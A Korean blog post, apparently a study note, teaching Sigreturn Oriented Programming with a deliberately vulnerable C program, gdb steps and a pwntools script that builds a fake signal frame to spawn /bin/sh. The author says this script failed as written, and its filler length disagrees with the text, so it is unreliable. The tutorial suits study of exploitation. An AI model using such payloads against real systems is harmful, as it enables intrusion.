---
layout: post
title: "Sigreturn oriented programming"
excerpt: "Try to know SROP & use it ~_~"
categories: [system]
comments: true 
---

이번에는 ROP의 다른 종류(?) 느낌인 SROP에 대하여 알아보자.

### 0x0 SROP?

sigreturn 시스템 콜을 이용하여 레지스터에 원하는 값을 저장하는 기법 > 이를 이용하여 원하는 시스템 함수를 호출

ROP를 하기에 가젯이 불충분할 경우 주로 사용 > 많은 가젯이 필요하지 않고 INT80 가젯만으로 충분



### 0x1 singal

SROP는 sigreturn으로 쉘을 따는데, sigreturn을 syscall table에서 찾아보면 eax로 119를 넘겨주면 실행되고, 파라미터로는 unsigend long이 요구된다.

시그널을 받은 프로세스가 커널 모드에서 유저모드로 복귀할 때 사용하는 system call이 sigreturn system call이다. 



### 0x2 example

```c
#include <stdio.h>

void int80(){
asm("int $0x80");
}

int main(){
char buf[8];
read(0,buf,128);
}
```

위와 같은 코드가 있을 때,  우리는 SROP를 하기 위해 read에서 bof를 발생 시킨 후 eax를 조작하고 ret addr를 int 0x80으로 넘겨줘야한다.  후에 이를 이용하여 /bin/sh을 실행시킨다. 119개의 문자열을 입력하고 int 0x80으로 ret하면 sigreturn함수가 호출된다. 

![srop1](/img/srop1.png)

우선 read다음으로 breakpoint를 걸고 A를 118개를 넣어본다. 그 후  x/40wx $rsp를 보면 아래같이 A로 가득찬걸 볼 수 있다.

![srop2](/img/srop2.png)

다음으로는  i r 을 통하여 레지스터 값을 본다.

![srop3](/img/srop3.png)

레지스터 값을 보면 rax 레지스터에 0x77이 들어가있는걸 확인할 수 있다. 이  0x77이 바로 sigreturn의 syscall number이다.  이제는 ret addr을 int 0x80 gadget으로 덮어씌우자. 

이제 int 0x80 함수를 보면 아래와 같다.

![srop4](/img/srop4.png)

이제 int80의 주소를 main의 ret addr에 넣을것이다 . gdb에서 set {int}0xffffd1d0=0x08048413를 이용하여 가능하다.

![srop5](/img/srop5.png)

이렇게 잘 덮어씌어진걸 알 수 있다.  이제는 sigreturn를 호출하는 sigcontext.h 구조체를 봐야한다.

```c
struct sigcontext{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```

이제 이를 참고하여 exploit code를 작성해보자.



### 0x3 exploit :

```python
from pwn import *
p = process('./srop')

syscall = 0x08048413

payload = "A"*20
payload += p32(syscall)
payload += p32(0x33)
payload += p32(0)
payload += p32(0x7b)
payload += p32(0x7b)
payload += p32(0)
payload += p32(0)
payload += p32(0) #ebp
payload += p32(0) #esp
payload += p32(0xffffd184)

payload += p32(0)
payload += p32(0)
payload += p32(0xb)
payload += p32(0)
payload += p32(0)
payload += p32(syscall)
payload += p32(0x73)
payload += p32(0x246)
payload += p32(0)
payload += p32(0x7b)
payload += "\x00"*(118-len(payload))

p.sendline(payload)
p.interactive()
```

아니 난 왜 대체 익스가 안되나 계속 생각해봤는데 아직도 모르겠다. 왜 계속 다른 레지스터들은 변조가 되는데 eip랑 ecx는 변조가 안될까...  결국 그냥 다시 코딩해서 해결했다. 왜 처음엔 안된걸까 

